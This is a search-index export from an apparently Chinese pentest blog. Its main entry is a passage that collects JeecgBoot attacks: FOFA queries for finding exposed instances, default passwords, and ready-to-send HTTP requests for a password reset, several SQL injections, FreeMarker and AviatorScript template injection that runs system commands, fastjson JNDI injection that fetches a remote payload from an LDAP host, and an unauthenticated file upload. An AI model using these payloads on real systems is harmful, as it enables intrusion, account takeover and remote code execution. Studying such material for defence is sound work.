<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>WebLogic、Shiro、Fastjson 利用链</title>
    <link href="/2025/09/19/WebLogic%E3%80%81Shiro%E3%80%81Fastjson%20%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2025/09/19/WebLogic%E3%80%81Shiro%E3%80%81Fastjson%20%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>360实习总结</title>
    <link href="/2025/08/25/360%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/08/25/360%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7c98a6ae9cf2de08a04ad066da7ba3342e406ed7d72d3d0d66875090603a7120">75b764c9e13fd99acaf0f71a5cd36f2bab4686701997416bcb22b33946400c3786683fd563fe2234994d7e782436b90617b02968cfe45decaf0db46e7a8affd4603250393a1259c059eef293e095afc6b568dd013bcc2852c1a1bd6d80ad6b1f004d39438767aa4444fc46d91c720015fdfbc5f29451d6d928ce4383b4b705ff20683d3a0f811eed70c94ff1bafdf0ac22a0e3adf8c7e0e6dfbbc6096c6e05e5782553251c8cb726997f8c1d0ce63bc708d8f29f97f5b559c0f89729de61a915a7738ea098347f7e4f6a0366766b22e0a361771b1edc5d03562392ce2f99c509202a3679a8973288fd0e3ef41ef08194bc3e2bd2e9f6cd6cfbbbb649cdf7dbd2ad361b259594fe71868cce0863095771fee71db1a2866053a5e1e73783efb4df50983a1819a8cbd6ed111275cd8a92c7525f3a40d4b3db6e653b49c80dec7c93e22d6340205533da1cdcb10723f003596c45d74aac2b59e69b0e130f7a9e3f80462f5af6bb5318b82a02d919c4227fb89bbc0994ea71973845e1a63a67ebfbe5460ca7e956fd108dea9513fc2ca3c5105c0fa96088a16648f4d3d86d841fd12998d0b2b8f0751a4c6fa547dfea952dbcd478e34d62ab9844eefb14d9842aa926960f399eeee91de397885d5f7a6cf434536bf8f0570c38b9b766e180c9ec2eeeba49a2fce9c6c0e72bc040f57e5a1f4fecbc0316d0008e4ed08b732daa49a548973998a6d079c3d83a4c5906e8ca5768c23d46bb77025bafc1fbef7c0b4b47c018a3f844e06c35afcb2586b4b31816bf4dc8b69c7fe17fbe148ab9d8d4584d08ef83afa2a24b03f199cf7610183eb0bd7ee990c80984398cfc12053e3ba07f5b7b6d4ce07428e4423c862240b28b0a1a5dbe9a5fc0cda06bfea79f2cb64d6328d02c3128604433d5d0872d8439745ca6d8cfdabdd1bbdc3c5c6fad381c0c51bc86c1918d244290751fe887462d7ee32e653c6fcd36fe7a4efc6718b8255fbff0441d809d0a33da2b75483bbaf5a5b52731c1dbeb95e32108f8554d160a7f5cd5cfc0abc2852a4490d468e5ebbcfd3673ea01a8146c3d01de954267537e1731c2eb06de66a7ed6e5a9c6fd954fb0088b3aa16d1e85a0da2169c77898e401f313b2df72718464fca9db27c5c118dd50345f81cc7fb9e8ee8e28240d777b148281f3ead99af65ac3da1466388068c3d38e6fbb1c9dde5a633fc8ffaf19df7c64db59b817c5192e7d927b6d2b12a8dd0ad11</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这是我的私人空间，请勿随意查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>个人VPS</title>
    <link href="/2025/07/23/VPS/"/>
    <url>/2025/07/23/VPS/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="af2dbe43c9b4aaea23c367d980b741830fb49c72a1600ab83f400b6b6b99a7ae">75b764c9e13fd99acaf0f71a5cd36f2ba44050054fda5dcae1975165c740db7a4c4524b3f589952e451d6063c87e66119bafb35cb4d2c6b7d4d0f77802ea908c474020b0cf1d35b45fe1448c0fb681eb88cafef13e8652af8cb3c85d5e093676b13c8b404e06df8ac6a4744ddd342dc13575714aa7750b894fdac7c3513b1f1e6866f4823ca9eaa00b6eb8e1e55e4bebd7fd9ab12cc82cec348df5eff0b24ec1457cd3849538f906d5550d9e928730215bcf626ea66e2b44d1c0b83b035af050da0b71d430d9866fa0554cdec89079131e3d2047aad205167a79fd216385263d7d202f10a7e88673655d78f08c0f8316754a88df89d244b371150fa8e38a543f03259e1da54f6f210520ed4a03bc51d81c02741aec4bdaffb28902c6096de465913c06118396f628aa72aa9e3e31c7b4ba5487966ea80a0ae70f17e3d03cff05cc283eb47f7b84c2aec1d3935b4eeefc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这是我的私人空间，请勿随意查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jeecg-boot漏洞挖掘</title>
    <link href="/2025/06/14/jeecg-boot%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2025/06/14/jeecg-boot%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JeecgBoot是一款集成AI应用的，基于BPM流程的低代码平台，旨在帮助企业快速实现低代码开发和构建个性化AI应用！前后端分离架构Ant Design&amp;Vue3，SpringBoot，SpringCloud Alibaba，Mybatis-plus，Shiro。强大的代码生成器让前后端代码一键生成，无需写任何代码！ 引领AI低代码开发模式: AI生成-&gt;OnlineCoding-&gt; 代码生成-&gt; 手工MERGE， 帮助Java项目解决80%的重复工作，让开发更多关注业务，提高效率、节省成本，同时又不失灵活性！低代码能力：Online表单、表单设计、流程设计、Online报表、大屏&#x2F;仪表盘设计、报表设计; AI应用平台功能：AI知识库问答、AI模型管理、AI流程编排、AI聊天等，支持含ChatGPT、DeepSeek、Ollama等多种AI大模型。</p><h2 id="fofa语句"><a href="#fofa语句" class="headerlink" title="fofa语句"></a>fofa语句</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">body</span>=<span class="hljs-string">&quot;/sys/common/pdf/pdfPreviewIframe&quot;</span><br><span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Jeecg-Boot 快速开发平台&quot;</span> || body=<span class="hljs-string">&quot;积木报表&quot;</span><br><span class="hljs-attr">body</span>=<span class="hljs-string">&quot;jeecg-boot&quot;</span><br><span class="hljs-attr">app</span>=<span class="hljs-string">&quot;JEECG&quot;</span><br><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;1380908726&quot;</span><br><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;-250963920&quot;</span><br></code></pre></td></tr></table></figure><h2 id="加载界面"><a href="#加载界面" class="headerlink" title="加载界面"></a>加载界面</h2><p><img src="/../images/6b1710a1-6074-4425-bb21-7ca65f052078.png" alt="6b1710a1-6074-4425-bb21-7ca65f052078"></p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin/123456<br>jeecg/123456<br>admn/admin<br><span class="hljs-built_in">test</span>/test<br>demo/test<br>jeecg/jeecg123456<br>guest/guest<br></code></pre></td></tr></table></figure><h2 id="JeecgBoot-passwordChange接口任意用户密码重置"><a href="#JeecgBoot-passwordChange接口任意用户密码重置" class="headerlink" title="JeecgBoot passwordChange接口任意用户密码重置"></a>JeecgBoot passwordChange接口任意用户密码重置</h2><blockquote><p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;user&#x2F;passwordChange?username&#x3D;admin&amp;password&#x3D;admin&amp;smscode&#x3D;&amp;phone&#x3D; HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko&#x2F;20100101 Firefox&#x2F;132.0<br>Accept: <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive</p></blockquote><h2 id="jeecg-boot-checkOnlyUser信息泄露漏洞"><a href="#jeecg-boot-checkOnlyUser信息泄露漏洞" class="headerlink" title="jeecg-boot-checkOnlyUser信息泄露漏洞"></a>jeecg-boot-checkOnlyUser信息泄露漏洞</h2><blockquote><p>&#x2F;jeecg-boot&#x2F;sys&#x2F;user&#x2F;querySysUser?username&#x3D;admin</p><p>Jeecg-Boot 2.4.5及之前版本存在不安全权限漏洞。攻击者可利用该漏洞通过uri:&#x2F;sys&#x2F;user&#x2F;checkOnlyUser?username&#x3D;admin提升权限并查看敏感信息。</p></blockquote><h2 id="jeecg-boot-目录遍历漏洞"><a href="#jeecg-boot-目录遍历漏洞" class="headerlink" title="jeecg-boot-目录遍历漏洞"></a>jeecg-boot-目录遍历漏洞</h2><blockquote><p>&#x2F;jeecg-boot&#x2F;online&#x2F;cgform&#x2F;head&#x2F;fileTree?_t&#x3D;1632524014&amp;parentPath&#x3D;&#x2F;</p><p>低权限账号访问直接返回服务器文件目录信息</p></blockquote><h2 id="Jeecg-boot-3-4-4-sys-dict-queryTableData-SQL注入"><a href="#Jeecg-boot-3-4-4-sys-dict-queryTableData-SQL注入" class="headerlink" title="Jeecg-boot 3.4.4 &#x2F;sys&#x2F;dict&#x2F;queryTableData SQL注入"></a>Jeecg-boot 3.4.4 &#x2F;sys&#x2F;dict&#x2F;queryTableData SQL注入</h2><blockquote><p>在Jeecg-boot 3.4.4中曾发现分类为致命的漏洞。 此漏洞会影响未知代码文件&#x2F;sys&#x2F;dict&#x2F;queryTableData。 手动调试的不合法输入可导致 SQL注入。</p><p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;qurestSql HTTP&#x2F;1.1<br>User-Agent: Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit&#x2F;525.13 (KHTML, like Gecko) Chrome&#x2F;0.2.149.29 Safari&#x2F;525.13<br>Content-Type: application&#x2F;json; charset&#x3D;utf-8<br>Content-Length: 127<br>Host:<br>Connection: close<br>Accept-Encoding: gzip, deflate</p><p>{“apiSelectId”:”1316997232402231298”,”id”:”1’ or ‘%1%’ like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or ‘%%’ like ‘“}</p></blockquote><h2 id="JeecgBoot-onlDragDatasetHead-getTotalData-SQL注入"><a href="#JeecgBoot-onlDragDatasetHead-getTotalData-SQL注入" class="headerlink" title="JeecgBoot onlDragDatasetHead&#x2F;getTotalData SQL注入"></a>JeecgBoot onlDragDatasetHead&#x2F;getTotalData SQL注入</h2><blockquote><p>JeecgBoot v3.7.1 通过组件 &#x2F;onlDragDatasetHead&#x2F;getTotalData 存在 SQL 注入漏洞。</p><p>POST &#x2F;jeecg-boot&#x2F;drag&#x2F;onlDragDatasetHead&#x2F;getTotalData HTTP&#x2F;2<br>Host:<br>Accept-Encoding: gzip, deflate<br>Accept: <em>&#x2F;</em><br>Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;109.0.5414.75 Safari&#x2F;537.36<br>Content-Type: application&#x2F;json<br>Content-Length: 281</p><p>{“tableName”:”sys_user”,”compName”:”test”,”condition”:{“filter”:{}},”config”:{“assistValue”:[],”assistType”:[],”name”:[{“fieldName”:”concat(0x7e,version(),0x7e)”,”fieldType”:”string”},{“fieldName”:”id”,”fieldType”:”string”}],”value”:[{“fieldName”:”id”,”fieldType”:”1”}],”type”:[]}}</p></blockquote><h2 id="jeecg-boot-getDictItemsByTable-SQL注入漏洞"><a href="#jeecg-boot-getDictItemsByTable-SQL注入漏洞" class="headerlink" title="jeecg-boot-getDictItemsByTable SQL注入漏洞"></a>jeecg-boot-getDictItemsByTable SQL注入漏洞</h2><blockquote><p>JeecgBoot是一款基于代码生成器的低代码开发平台，它专为简化Java项目开发流程、提高开发效率而设计。攻击者通过注入恶意的SQL代码，能够窃取、篡改或删除数据库中的数据，甚至执行系统命令，对网站和服务器造成严重影响。</p><p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;ng-alain&#x2F;getDictItemsByTable&#x2F;‘%20from%20sys_user&#x2F;*,%20’&#x2F;x.js HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>Sec-Purpose: prefetch<br>Connection: close<br>Priority: u&#x3D;6</p></blockquote><h2 id="Jeecg-Boot-jmreport-show-SQL注入漏洞"><a href="#Jeecg-Boot-jmreport-show-SQL注入漏洞" class="headerlink" title="Jeecg-Boot &#x2F;jmreport&#x2F;show SQL注入漏洞"></a>Jeecg-Boot &#x2F;jmreport&#x2F;show SQL注入漏洞</h2><blockquote><p>jeecg-boot 3.5.0和3.5.1 版本存在安全漏洞，该漏洞源于 &#x2F;jeecg-boot&#x2F;jmreport&#x2F;show 接口的 id 参数存在SQL注入漏洞。</p><p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;show HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 5.1) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;34.0.1866.237 Safari&#x2F;537.36<br>Connection: close<br>Content-Length: 182<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Accept-Encoding: gzip</p><p>{<br>“id”: “961455b47c0b86dc961e90b5893bff05”,<br>“apiUrl”: “”,<br>“params”: {<br>“id “: “1 ‘ or ‘ % 1 % ‘ like (updatexml(0x3a,concat(1,(version())),1)) or ‘ % % ‘ like ‘“<br>}<br>}</p></blockquote><h2 id="jeecg-boot-sys-duplicate-check-SQL注入"><a href="#jeecg-boot-sys-duplicate-check-SQL注入" class="headerlink" title="jeecg-boot sys&#x2F;duplicate&#x2F;check SQL注入"></a>jeecg-boot sys&#x2F;duplicate&#x2F;check SQL注入</h2><blockquote><p>&#x2F;sys&#x2F;duplicate&#x2F;check 接口SQL注入，checksql可以被绕过，该漏洞需要进行身份认证。</p><p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;duplicate&#x2F;check?tableName&#x3D;v3_hello&amp;fieldName&#x3D;1+and%09if(user(%20)&#x3D;‘root@localhost’,sleep(0),sleep(0))&amp;fieldVal&#x3D;1&amp;dataId&#x3D;asd HTTP&#x2F;1.1<br>Host:<br>Accept-Encoding: gzip, deflate<br>Accept: <em>&#x2F;</em><br>Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;103.0.5060.114 Safari&#x2F;537.36<br>Connection: close<br>Cache-Control: max-age&#x3D;0<br>X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</p><p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;duplicate&#x2F;check?tableName&#x3D;sys_log&amp;fieldName&#x3D;1+and%09if(user(%20)&#x3D;‘root@localhost’,sleep(0),sleep(10))&amp;fieldVal&#x3D;1000&amp;dataId&#x3D;2000 HTTP&#x2F;1.1<br>Host:<br>Accept-Encoding: gzip, deflate<br>Accept: <em>&#x2F;</em><br>Accept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;103.0.5060.114 Safari&#x2F;537.36<br>Connection: close<br>Cache-Control: max-age&#x3D;0<br>X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</p></blockquote><h2 id="JeecgBoot-jmreport-loadTableData-SSTI模板注入漏洞"><a href="#JeecgBoot-jmreport-loadTableData-SSTI模板注入漏洞" class="headerlink" title="JeecgBoot jmreport&#x2F;loadTableData SSTI模板注入漏洞"></a>JeecgBoot jmreport&#x2F;loadTableData SSTI模板注入漏洞</h2><blockquote><p>jeecg-boot 版本 3.5.3 中的 SSTI 注入漏洞允许远程攻击者通过对 &#x2F;jmreport&#x2F;loadTableData 组件进行精心设计的 HTTP 请求执行任意代码。</p><p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;loadTableData HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;116.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>X-Sign: AD0488642A880C68C8E3551C3BE0F6F5<br>X-TIMESTAMP: 1699726206096<br>X-Access-Token: null<br>token: null<br>JmReport-Tenant-Id: null<br>Content-Length: 167<br>Connection: close<br>Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8&#x3D;1699726144; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8&#x3D;1699726162</p><p>{“dbSource”:””,”sql”:”select ‘&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;${value(&quot;whoami&quot;)}’”,”tableName”:”test_demo);”,”pageNo”:1,”pageSize”:10}</p></blockquote><h2 id="JeecgBoot-AviatorScript表达式注入"><a href="#JeecgBoot-AviatorScript表达式注入" class="headerlink" title="JeecgBoot AviatorScript表达式注入"></a>JeecgBoot AviatorScript表达式注入</h2><blockquote><p>积木报表软件存在AviatorScript代码注入RCE漏洞。使用接口&#x2F;jmreport&#x2F;save处在text中写入AviatorScript表达式。访问&#x2F;jmreport&#x2F;show触发AviatorScript解析从而导致命令执行。</p><p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;queryFieldBySql?previousPage&#x3D;xxx&amp;jmLink&#x3D;YWFhfHxiYmI&#x3D;&amp;token&#x3D;123 HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;115.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Content-Type: application&#x2F;json<br>Content-Length: 108</p><p>{“sql”:”select ‘result:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ex(&quot;whoami &quot;) }’”<br>}</p></blockquote><h2 id="jeecg-boot后台-sysMessageTemplate-sendMsg接口freemaker模板注入"><a href="#jeecg-boot后台-sysMessageTemplate-sendMsg接口freemaker模板注入" class="headerlink" title="jeecg-boot后台&#x2F;sysMessageTemplate&#x2F;sendMsg接口freemaker模板注入"></a>jeecg-boot后台&#x2F;sysMessageTemplate&#x2F;sendMsg接口freemaker模板注入</h2><blockquote><p>jeecg-boot的Freemarker模板注入导致远程命令执行, 远程攻击者可利用该漏洞调用在系统上执行任意命令。</p><p>1、添加一个测试模板</p><p>POST &#x2F;jeecg-boot&#x2F;sys&#x2F;message&#x2F;sysMessageTemplate&#x2F;add HTTP&#x2F;1.1<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao<br>Tenant-Id: 0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: cross-site<br>Priority: u&#x3D;0<br>Te: trailers<br>Connection: close<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Content-Length: 141</p><p>{“templateType”:”1”,”templateCode”:”5”,”templateName”:”test111”,”templateContent”:”${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}”}</p><p>2、发送模板</p><p>POST &#x2F;jeecg-boot&#x2F;sys&#x2F;message&#x2F;sysMessageTemplate&#x2F;sendMsg HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao<br>Tenant-Id: 0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: cross-site<br>Priority: u&#x3D;0<br>Te: trailers<br>Connection: close<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Content-Length: 64</p><p>{“templateCode”:”5”,”testData”:”{}”,”receiver”:””,”msgType”:”1”}</p><p>3、执行模板并查看返回结果</p><p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;message&#x2F;sysMessage&#x2F;list?_t&#x3D;1732776144&amp;column&#x3D;createTime&amp;order&#x3D;desc&amp;field&#x3D;id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&amp;pageNo&#x3D;1&amp;pageSize&#x3D;10 HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko&#x2F;20100101 Firefox&#x2F;133.0<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate, br<br>X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao<br>Tenant-Id: 0<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: cross-site<br>Priority: u&#x3D;0<br>Te: trailers<br>Connection: close<br>Accept-Encoding: gzip</p></blockquote><h2 id="Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞"><a href="#Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞" class="headerlink" title="Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞"></a>Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞</h2><blockquote><p>JEECG 4.0 及之前版本中，由于 &#x2F;api 接口鉴权时未过滤路径遍历，攻击 者可构造包含 ..&#x2F; 的 url 绕过鉴权。 因为依赖 1.2.31 版本的 fastjson， 该版本存在反序列化漏洞。攻击者可对</p><p>&#x2F;api&#x2F;..&#x2F;jeecgFormDemoController.do?interfaceTest 接口进行 jndi 注入攻 击实现远程代码执行。</p><p>POST &#x2F;api&#x2F;..&#x2F;jeecgFormDemoController.do?interfaceTest&#x3D; HTTP&#x2F;1.1<br>Host:<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;120.0.0.0 Safari&#x2F;537.36<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7<br>Accept-Encoding: gzip, deflate, br<br>cmd: whoami<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 77</p><p>serverUrl&#x3D;<a href="http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET">http://xxxxxxxx:8877/jeecg.txt&amp;requestBody=1&amp;requestMethod=GET</a></p><p>创建如下远程文件，其内容为fastjson代码执行的payload</p><p>{<br>“a”:{<br>“@type”:”java.lang.Class”,<br>“val”:”com.sun.rowset.JdbcRowSetImpl”<br>},<br>“b”:{<br>“@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>“dataSourceName”:”ldap:&#x2F;&#x2F;10.66.64.89:1389&#x2F;8orsiq”,<br>“autoCommit”:true<br>}<br>}</p></blockquote><h2 id="jeecg-boot-jmreport-upload接口存在未授权任意文件上传"><a href="#jeecg-boot-jmreport-upload接口存在未授权任意文件上传" class="headerlink" title="jeecg-boot&#x2F;jmreport&#x2F;upload接口存在未授权任意文件上传"></a>jeecg-boot&#x2F;jmreport&#x2F;upload接口存在未授权任意文件上传</h2><blockquote><p>测试发现&#x2F;jeecg-boot&#x2F;jmreport&#x2F;upload接口存在未授权任意文件上传，经实测发现上传接口未授权，但访问上传后的文件需要登录，即带token。</p><p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;upload HTTP&#x2F;1.1<br>User-Agent: Mozilla&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0; <a href="http://www.baidu.com/search/spider.html">http://www.baidu.com/search/spider.html</a>)<br>Accept: <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Host:<br>Content-Length: 1476</p><p>——WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”11111.txt”<br>Content-Type: text&#x2F;html</p><p>&lt;%! 1111&gt;<br>——WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Content-Disposition: form-data; name&#x3D;”fileName”</p><p>11111.txt<br>——WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Content-Disposition: form-data; name&#x3D;”biz”</p><p>excel_online<br>——WebKitFormBoundaryyfyhSCMs9cajzFD4–</p></blockquote><h2 id="Jeecg-commonController-do文件上传"><a href="#Jeecg-commonController-do文件上传" class="headerlink" title="Jeecg-commonController.do文件上传"></a>Jeecg-commonController.do文件上传</h2><blockquote><p>由于 &#x2F;api 接口鉴权时未过滤路径遍历，攻击者可构造包含 ..&#x2F; 的url绕过鉴权。攻击者可构造恶意请求利用 commonController 